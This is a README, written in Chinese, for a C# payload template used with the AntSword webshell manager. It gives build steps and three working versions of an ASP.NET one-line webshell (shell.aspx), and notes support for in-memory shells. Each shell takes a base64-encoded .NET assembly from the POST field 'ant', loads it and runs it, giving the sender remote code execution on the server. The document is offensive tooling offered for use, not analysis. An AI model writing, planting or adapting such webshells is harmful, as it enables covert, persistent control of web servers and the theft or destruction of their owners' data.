# AntSword-Csharp-Template v1.1

中国蚁剑Csharp一句话Payload

编译环境：.net 2.0

适用范围：.net 2.0 及以上

## 编译

在build.py中替换你的csc路径后运行，即可在`./dist`目录下自动生成代码模板。

```
python3 build.py
```

编译完成后将`./dist/`目录下所有文件拷贝至`antSword-master/source/core/aspxcsharp/template/`下即可

## Shell

### shell.aspx

```
<%@ Page Language="c#"%>
<%
    String Payload = Request.Form["ant"];
    if (Payload != null)
    {
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
        assembly.CreateInstance(assembly.GetTypes()[0].Name).Equals(this);
    }
%>
```

为了兼容各种情况下的内存马，Equals中的入口参数可以为System.Web.UI.Page对象，或者System.Web.UI.Page.Context对象，或者包含Request与Response对象的数组。

即

```
<%@ Page Language="c#"%>
<%
    String Payload = Request.Form["ant"];
    if (Payload != null)
    {
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
        assembly.CreateInstance(assembly.GetTypes()[0].Name).Equals(Context);
    }
%>
```

或者

```
<%@ Page Language="c#"%>
<%
    String Payload = Request.Form["ant"];
    if (Payload != null)
    {
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
        assembly.CreateInstance(assembly.GetTypes()[0].Name).Equals(new object[] { Request, Response });
    }
%>
```



## 更新日志

### v 1.1

1. 兼容内存马
2. Payload类名不再固定

### v 1.0

1. release